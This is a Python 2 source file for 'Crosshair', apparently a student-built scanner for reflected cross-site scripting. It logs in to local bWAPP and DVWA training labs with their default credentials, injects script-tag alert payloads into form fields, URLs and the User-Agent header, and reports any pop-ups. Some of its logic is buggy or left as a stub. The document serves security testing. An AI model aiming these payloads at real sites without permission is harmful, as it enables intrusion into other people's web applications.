#!/usr/bin/env python
__author__ = "Daniel Williams / C3378215"

from browsermobproxy import Server
import re, sys, json, pickle, base64
import argparse

# ----- Proxy server ----- #
server = Server("/root/Desktop/browsermob-proxy-2.1.0-beta-5/bin/browsermob-proxy")
server.start()
proxy = server.create_proxy()

# ----- Import Selenium Driver/Services ----- #
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.select import Select

print '''
.     ______  ______  ______  ______  ______       __  __  ______  __  ______    .
 .   /\  ___\/\  == \/\  __ \/\  ___\/\  ___\     /\ \_\ \/\  __ \/\ \/\  == \    .
  .  \ \ \___\ \  __<\ \ \/\ \ \___  \ \___  \    \ \  __ \ \  __ \ \ \ \  __<     .
   .  \ \_____\ \_\ \_\ \_____\/\_____\/\_____\    \ \_\ \_\ \_\ \_\ \_\ \_\ \_\    .
    .  \/_____/\/_/ /_/\/_____/\/_____/\/_____/     \/_/\/_/\/_/\/_/\/_/\/_/ /_/     .
     .                                                                                .
                                                                            '''

# Fetch username, password input boxes and submit button
def fsbmt():
    '''
    locate submit button using Xpaths
    '''
    try:
        try:
            fsbmt.submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            fsbmt.submit = driver.find_element_by_xpath("//input[@type='Submit']")
    except:
        print "could not locate submit button \n"
        # ----- If Submit button can't be located ask user for HTML submit name ----- #
        submit_name = raw_input("What is the submit box HTML name? ")
        fsbmt.submit = driver.find_element_by_name(submit_name)


def auth(auth1):
    '''
    If -a is set as as an argument, locate login page and acquire session token prior to exploitation
    '''
    looper = True
    while looper == True:
        # ----- Locate Login Page ----- #
        login_url = raw_input("What is the URL of the login page you want to access? ")
        # ----- if the user does not put http:// at start of url add one ----- #
        if login_url.startswith("http://"):
            try:
                driver.get(login_url)
                looper = False

            except:
                print "Something went wrong trying to load the URL please re-enter the URL \n"
        # ----- If user doesnt enter anything stay in while loop and ask for url again ----- #
        elif login_url == "":
            print "Please enter a URL"
        else:
            add = "http://" + login_url
            driver.get(add)
            looper = False
    # find login boxes
    looper = True
    next = 0
    if auth1 == True:
        while looper == True:
            INPUT_uname = raw_input("What is the username? ")
            INPUT_pass = raw_input("What's the Pass? ")

            # Locate login box
            try:
                auth.username = driver.find_element_by_id("login")
                print "a"
            except:
                next = next + 1
                print "a2"
                print next
                pass

            if next == 1:
                try:
                    auth.username = driver.find_element_by_name("login")
                    print "b"
                except:
                    next += 1
                    print "b2"
                    pass

            if next == 2:
                try:
                    auth.username = driver.find_element_by_name("username")
                    print "c"
                except:
                    next += 1
                    print "c2"
                    pass

            if next == 3:
                try:
                    auth.username = driver.find_element_by_name("email")
                    print "d"
                except:
                    next += 1
                    print "d2"
                    pass

            if next == 4:
                try:
                    auth.username = driver.find_element_by_name("user")
                    print "e"
                except:
                    next += 1
                    print "e2"
                    pass

            if next == 5:
                try:
                    auth.username = driver.find_element_by_name("user_id")
                    print "f"
                except:
                    next += 1
                    print "f2"
                    pass

            if next == 6:
                try:
                    auth.username = driver.find_element_by_name("user-id")
                    print "g"
                except:
                    next += 1
                    print "g2"
                    pass

            if next == 7:
                print "could not locate login field \n"
                login_name = raw_input("What is the login box HTML name? ")
                auth.username = driver.find_element_by_name(login_name)

            # Try to locate password field
            next = 0
            try:
                auth.password = driver.find_element_by_name("password")
            except:
                pass
            if next == 0:
                try:
                    auth.password = driver.find_element_by_name("pass")
                except:
                    next += 1
                    pass
            if next == 1:
                try:
                    auth.password = driver.find_element_by_name("passwd")
                except:
                    next += 1
                    pass
            if next == 2:
                try:
                    auth.password = driver.find_element_by_name("Password")
                except:
                    next += 1
                    pass
            else:
                print "could not locate password field \n"
                Password_name = raw_input("What is the password box HTML name? ")
                auth.username = driver.find_element_by_name(Password_name)

            # locate submit field
            fsbmt()
            # enter inputs
            auth.username.send_keys(INPUT_uname)
            auth.password.send_keys(INPUT_pass)
            # click on the submit button
            fsbmt.submit.click()

            try:
                # If a login box is detected then authentication failed
                driver.find_element_by_name("login")
                print "Something Went Wrong During Authentication, try re enter U & P"
            except:
                # return False
                looper = False


def my_opt():
    '''
    Parse args from user
    '''
    parser = argparse.ArgumentParser('crosshair <url> -a <scanning page has authentication>', version="Crosshair v1.0")
    parser.add_argument('-u', '--url', dest='url', help='URL to fetch data from')
    parser.add_argument('-a', '--auth', dest='auth', action='store_true', default=False,
                        help="Specify if the page you are scanning requires authentication")
    # parser.add_argument('-v', nargs="?",dest='verbose', action='store_true', default=False,
    #                     help="For Verbose Output from the application including get and post responses")

    args = parser.parse_args()
    my_opt.URL = args.url
    #my_opt.verb = args.verbose
    print args
    if not args.url:
        print 'You must specify a URL.', sys.argv[0], '--help for more details'
        exit(1)
    if args.auth == True:
        print 'link to the next bit.', sys.argv[1], '--help for more details'
        auth(args.auth)
    return args


# ['-a', '-u','http://192.168.127.178/dvwa/login.php']

# load what you want to test with (change to phantomjs later)
profile = webdriver.FirefoxProfile()
# Setup Proxy
profile.set_proxy(proxy.selenium_proxy())
driver = webdriver.Firefox(firefox_profile=profile)
# Get a a web page
proxy.new_har("Phase1")  # proxy name

# #uncomment to reparse args
# my_opt()
# #args-url location
# target_url = my_opt.URL
# driver.get(target_url)
# pickle.dump(driver.get_cookies(),open("cookies.pkl", "wb"))

#
#Testing Delete later
# Testing Auth____ Comment IN TO autologin Bwap
driver.get("http://192.168.127.144/bWAPP/login.php")
select = Select(driver.find_element_by_name('security_level'))
select.select_by_visible_text("low")
username = driver.find_element_by_id("login")
password = driver.find_element_by_name("password")
submit = driver.find_element_by_xpath("//button[@type='submit']")
username.send_keys("bee")
password.send_keys("bug"),
# click on the submit button
submit.click()

#target_url = 'http://192.168.127.144/bWAPP/xss_user_agent.php'
#
target_url = 'http://192.168.127.144/bWAPP/xss_get.php?'
# # BWAPP TEST Start
# # XXS GET TESTq
driver.get(target_url)
# ===== Dump Cookies for User Agent ===== #
pickle.dump(driver.get_cookies(),open("cookies.pkl", "wb"))

# driver.get('''http://192.168.127.144/bWAPP/xss_get.php?firstname="><script>alert("l33thax")</script>&lastname="><script>alert("l33thax")</script>&form=submit ''')
# exit(0)
#
# #Testing Auth____ Comment IN TO autologin DVWA
# driver.get("http://192.168.127.178/dvwa/login.php")
# username = driver.find_element_by_name("username")
# password = driver.find_element_by_name("password")
# submit = driver.find_element_by_name("Login")
# username.send_keys("admin")
# password.send_keys("admin"),
# # click on the submit button
# submit.click()
#
# # DVWA TEST Start
# target_url = "http://192.168.127.178/dvwa/vulnerabilities/xss_r/"
# driver.get(target_url)
# # ===== Dump Cookies for User Agent ===== #
# pickle.dump(driver.get_cookies(),open("cookies.pkl", "wb"))

# # attack ulr test
# driver.get("http://192.168.127.178/dvwa/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert%28%22l33thax%22%29%3C%2Fscript%3E")
# exit(1)

# token = "document.cookie"
token = "l33thax"
escaped_token = "13378080"

def PAYLOAD():
    '''
    XSS Payloads
    '''
    PAYLOAD.PLD1 = '''<script>alert("''' + token + '''")</script>'''
    PAYLOAD.PLD2 = '''"><script>alert("''' + token + '''")</script>'''

    #=============== Payload for Escape quotes =======================#
    PAYLOAD.PLD3 = '''"><script>alert(13378080);</script>'''

    #PAYLOAD.PLD4 = """'';!--"<b>b</b><script>alert('""" + escaped_token + """')</script>=&{()}"""


class encoders:
    def html_encode(self, prse):
        '''
        Swaps characters in string
        '''
        html_chars = (
            ("'", '&#39;'),
            ('"', '&quot'),
            (">", '&gt;'),
            ("<", '&lt;'),
            ("&", "&#38;"),
            ("(", '&#40;'),
            (")", '&#41;')

        )
        for chars in html_chars:
            prse = prse.replace(chars[0], chars[1])
        return prse

    def url_encode(self, prse):
        '''
        Swaps characters in string
        '''
        url_chars = (
            ("'",'%27'),
            #lower double quote code
            ('"','%22'),
            (">",'%3E'),
            ("<",'%3C'),
            ("&","%26"),
            ("(",'%28'),
            (")",'%29'),
            ('/','%2F')

        )
        for chars in url_chars:
            prse = prse.replace(chars[0], chars[1])
        return prse


PAYLOAD()
enc = encoders()
# PAYLOAD.PLD1 = enc.html_encode(PAYLOAD.PLD1)

# PAYLOAD.PLD1 = base64.b64encode(PAYLOAD.PLD2)
# PAYLOAD.PLD1 = binascii.hexlify(PAYLOAD.PLD2)

alerts_detected = 0


def reg_slice(PHR):
    '''
    Regex Slicing of HAR Data
    :param PHR:
    :return:
    '''

    stp1 = re.findall(r''''queryString':.\[.*?\]''', PHR)

    stp1_url = re.findall(ur'''http:.*?(.*?')''', PHR)

    stp2 = re.findall(r"""'name\\':.*?('.*?')""", str(stp1))
    stp2_value = re.findall(r"""value\\':.*?('.*?')""", str(stp1))

    stp2_url = re.findall(r"""url\\':.*?('.*?')""", str(stp1))

    name_list = re.findall(r"'([A-Za-z]*?)\\", str(stp2))
    stp_3 = re.findall(r"''(.*?)\\", str(stp2_value))

    url_list = []

    for i in stp1_url:
        url_list.append(i[2:-1])

    for i in url_list:
        if name_list[0] in i:
            # print i
            query1 = i

    value_list = []
    for f in stp2_value:
        f = f[1:-2]
        value_list.append(f)

    reg_slice.qry1 = query1
    reg_slice.nm_lst = name_list
    reg_slice.vl_lst = value_list


def construct_url(target, nmlst, vllst):
    '''
    construct URL from HAR
    :param target:
    :param nmlst:
    :param vllst:
    :return: attack string
    '''
    if target.endswith("?"):
        pass
    else:
        target = target + '?'

    nv_len = 0
    payload_url = []
    payload_url.append(target)

    if len(nmlst) == len(vllst):
        nv_len = len(nmlst)
        pass
    else:
        print "something went wrong acquiring name and value pairs"
        exit(1)

    # replace with custom attack strings
    # cycle2 = 0
    #
    # for i in vllst:
    #     if token in i:
    #         vllst[cycle2] = pload
    #         cycle2 += 1
    construct_url.input_list= nmlst
    construct_url.value_list= vllst
    # Construst Payload url
    list_value = 0
    while nv_len > 0:
        for nm in nmlst:
            payload_url.append(nm)
            payload_url.append('=')
            payload_url.append(vllst[list_value])
            payload_url.append('&')
            list_value += 1
            nv_len -= 1
    payload_url

    at = ''.join(payload_url)
    attack_string = at[:-1]
    return attack_string


def alert_detection(inum):
    # --------- Try to switch to dialogue screen, wait three seconds if no there,
    global alerts_detected
    for num in range(inum):
        try:
            WebDriverWait(driver, 2).until(EC.alert_is_present(),
                                           'Timed out waiting for PA creation ' + 'confirmation popup to appear.')

            driver.switch_to.alert


            a = Alert(driver).text
            if a == token:
                print "a %s has been detected \n" % a
                alerts_detected += 1
            elif a == escaped_token:
                print "your quote escapes have been evaded! %s \n" % a
                alerts_detected += 1
            else:
                print "An unexpected alert box was accepted"
            Alert(driver).accept()

            print "alerts after detection %s" % alerts_detected

            # print check
        except TimeoutException:
            print "no alert"



def question_inputs():

    try:
        INPUT = driver.find_elements_by_tag_name('input')
        question_inputs.input_num = 0
        for num in INPUT:
            question_inputs.input_num += 1
    except:
        print "No inputs were detected"


def XSS_ref():
    # locate submit
    global alerts_detected
    try:
        try:
            submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            submit = driver.find_element_by_xpath("//input[@type='Submit']")
    except:
        print "could not locate submit button \n"
        submit_name = raw_input("What is the submit box HTML name? ")
        submit = driver.find_element_by_name(submit_name)

    INPUT = driver.find_elements_by_tag_name('input')
    input_num = 0
    print "\n#====== Phase1 ======#"
    # attempt payload1
    for i in INPUT:
        i.send_keys(PAYLOAD.PLD1)
        input_num += 1
        # print "Number of tokens detected in Reflected Get " + tokencount
        # print json.dumps(HAR)
    submit.click()
    HAR = proxy.har
    # #HarDepug print in format
    #print HAR
    try:
        if my_opt.verb == True:
            print json.dumps(HAR, sort_keys=True, indent=4)
    except:
        pass

    reg_slice(str(HAR))
    # construct Payload URL based on target URL, name list from HAR,
    PLD_URL1 = construct_url(target_url, reg_slice.nm_lst, reg_slice.vl_lst)
    print "Payload URL"
    print PLD_URL1

    alert_detection(input_num)

    # detect = re.findall(r"%s" % token, str(HAR))
    # tokencount = len(detect)

    # Make dictionary of name - value pairs
    nm_val_dict = dict(zip(construct_url.input_list,construct_url.value_list))

    XSS_refToken = alerts_detected

    if alerts_detected > 0:
        print "Reflected XSS has detected on inputs with these names."
        for c, v in nm_val_dict.iteritems():
            if token in v:
                print c
    #
    # # !!!!! REMOVE !!!!! #
    # alerts_detected = 0
    # # !!!!! REMOVE !!!!! #

    #if nothing is detected cycle through payloads
    # 1b encode payload
    if alerts_detected == 0:
        try:
            split_start = PLD_URL1.split("?",1)[0]
            split_end = PLD_URL1.split("?", 1)[1]



            ### ---- Reconect string ---- ###
            split_end = enc.url_encode(split_end)
            #enc_ploadURL = split_start + "?" +enc.html_encode(split_end)
            enc_ploadURL = split_start + "?" + split_end

            print "Attempting payload encoding........................... "

            driver.get(enc_ploadURL)

            XSS_refToken = alerts_detected

            alert_detection(input_num)
            if alerts_detected > 0:
                print "Encoded Reflected XSS has detected on inputs with these names."
                for c, v in nm_val_dict.iteritems():
                    if token in v:
                        print c

        except:
            print "Something went wrong"

    # Attempt payload 2

    # # !!!!! REMOVE !!!!! #
    # alerts_detected = 0
    # # !!!!! REMOVE !!!!! #

    # if nothing is detected cycle through payloads
    if alerts_detected == 0:
        print "\n#====== Phase2 ======#"
        proxy.new_har("Phase2")
        try:
            try:
                submit = driver.find_element_by_xpath("//button[@type='submit']")
            except:
                submit = driver.find_element_by_xpath("//input[@type='submit']")
        except:
            print "could not locate submit button \n"
            submit_name = raw_input("What is the submit box HTML name? ")
            submit = driver.find_element_by_name(submit_name)

        try:
            INPUT = driver.find_elements_by_tag_name('input')
            input_num = 0

            # attempt payload1
            for i in INPUT:
                i.send_keys(PAYLOAD.PLD2)
                input_num += 1
                # print "Number of tokens detected in Reflected Get " + tokencount
                # print json.dumps(HAR)
            submit.click()
            HAR = proxy.har
            # #HarDepug print in format
            # print HAR
            try:
                if my_opt.verb == True:
                    print json.dumps(HAR, sort_keys=True, indent=4)
            except:
                pass

            reg_slice(str(HAR))
            # construct Payload URL based on target URL, name list from HAR,
            PLD_URL2 = construct_url(target_url, reg_slice.nm_lst, reg_slice.vl_lst)
            print "Payload URL"
            print PLD_URL2

            alert_detection(input_num)

            # detect = re.findall(r"%s" % token, str(HAR))
            # tokencount = len(detect)

            # Make dictionary of name - value pairs
            nm_val_dict = dict(zip(construct_url.input_list, construct_url.value_list))

            #alert_detection(input_num)
            XSS_refToken = alerts_detected

            if alerts_detected > 0:
                print "Unescaped Reflected XSS e.g has detected on inputs with these names."
                for c, v in nm_val_dict.iteritems():
                    if token in v:
                        print c

        except:
            print "Something Went wrong stage 2 "


        ## Stage 2 Encoding if possible


        ## -----------------------------##

    # =================   =======Attempt payload 3  escaped chars =========   ========#

    # # !!!!! REMOVE !!!!! #
    # alerts_detected = 0
    # # !!!!! REMOVE !!!!! #

    # if nothing is detected cycle through payloads
    if alerts_detected == 0:
        print "\n#====== Phase3 ======#"
        proxy.new_har("Phase3")
        try:
            try:
                submit = driver.find_element_by_xpath("//button[@type='submit']")
            except:
                submit = driver.find_element_by_xpath("//input[@type='submit']")
        except:
            print "could not locate submit button \n"
            submit_name = raw_input("What is the submit box HTML name? ")
            submit = driver.find_element_by_name(submit_name)
        #
        try:

            INPUT = driver.find_elements_by_tag_name('input')
            input_num = 0

            # attempt payload1
            for i in INPUT:
                i.send_keys(PAYLOAD.PLD3)
                input_num += 1
                # print "Number of tokens detected in Reflected Get " + tokencount
                # print json.dumps(HAR)
            submit.click()
            HAR = proxy.har
            # #HarDepug print in format
            # print HAR
            try:
                if my_opt.verb == True:
                    print json.dumps(HAR, sort_keys=True, indent=4)
            except:
                pass

            reg_slice(str(HAR))
            # construct Payload URL based on target URL, name list from HAR,
            PLD_URL3= construct_url(target_url, reg_slice.nm_lst, reg_slice.vl_lst)

            print "Payload URL"
            print PLD_URL3

            alert_detection(input_num)

            # detect = re.findall(r"%s" % token, str(HAR))
            # tokencount = len(detect)

            # Make dictionary of name - value pairs
            nm_val_dict = dict(zip(construct_url.input_list, construct_url.value_list))

            #alert_detection(input_num)
            XSS_refToken = alerts_detected
            print alerts_detected
            if alerts_detected > 0:
                print "Unescaped Reflected XSS e.g has detected on inputs with these names."
                for c, v in nm_val_dict.iteritems():
                    if escaped_token in v:
                        print c


        except:
            print "Something Went wrong stage 3 "

    if XSS_refToken > 0:
        print "\nNumber of XSS_Ref tokens detected %s " % XSS_refToken
        alerts_detected += XSS_refToken
    else:
        print "\nNo injection points were detected on the selected site"
        print XSS_refToken
        # print HAR
        # json_parsed = json.lo(str(HAR))
        # print json.dumps(json_parsed, indenpt=4, sort_keys=True)
    print "input num %s "% input_num


def XSS_U_agent():
    global alerts_detected
    try:
        print "\n#====== Testing User Agent ======# "
        profile = webdriver.FirefoxProfile()
        profile.set_preference("general.useragent.override", PAYLOAD.PLD3)

        # Setup Proxy'';!--"<XSS>=&{()}
        profile.set_proxy(proxy.selenium_proxy())
        driver = webdriver.Firefox(firefox_profile=profile)

        #WebDriverWait(driver, 2).until(driver.get(target_url))
        driver.get(target_url)

        for cookie in pickle.load(open("cookies.pkl", "rb")):
            driver.add_cookie(cookie)

        driver.get(target_url)

        # User Agent Detection #

        WebDriverWait(driver, 2).until(EC.alert_is_present(),
                                       'Timed out waiting for PA creation ' + 'confirmation popup to appear.')

        driver.switch_to.alert

        a = Alert(driver).text

        if a == token:
            print "XSS has been detected in the user agent field \n"
            alerts_detected += 1
        elif a == escaped_token:
            print "XSS has been detected in the user agent field \n"
            alerts_detected += 1
        else:
            print "An unexpected alert box was accepted"
        Alert(driver).accept()

    except:
        print "No XSS was detected in the useragent"

def XSS_stored():
    global alerts_detected
    XSS_storedToken = 0
    try:
        try:
            submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            submit = driver.find_element_by_xpath("//input[@type='submit']")
    except:
        print "could not locate submit button \n"
        submit_name = raw_input("What is the submit box HTML name? ")
        submit = driver.find_element_by_name(submit_name)



    if XSS_storedToken > 0:
        print "\nNumber of XSS_Ref tokens detected %s " % XSS_storedToken
        alerts_detected += XSS_storedToken
    else:
        print "\nNo injection points were detected on the selected site"
        print XSS_storedToken
        # print HAR
        # json_parsed = json.lo(str(HAR))
        # print json.dumps(json_parsed, indenpt=4, sort_keys=True)if alerts_detected == 0:

question_inputs()

if question_inputs.input_num > 0:
    XSS_ref()


    XSS_U_agent()

    if alerts_detected == 0:
        #XSS_stored()
        print "alerts == 0 if "
else:
    XSS_U_agent()




# if alerts_detected > 0:
#     print "\nNumber of Total Alerts detected %s " % alerts_detected
#
# else:
#     print "\nNo injection points were detected on the selected site"






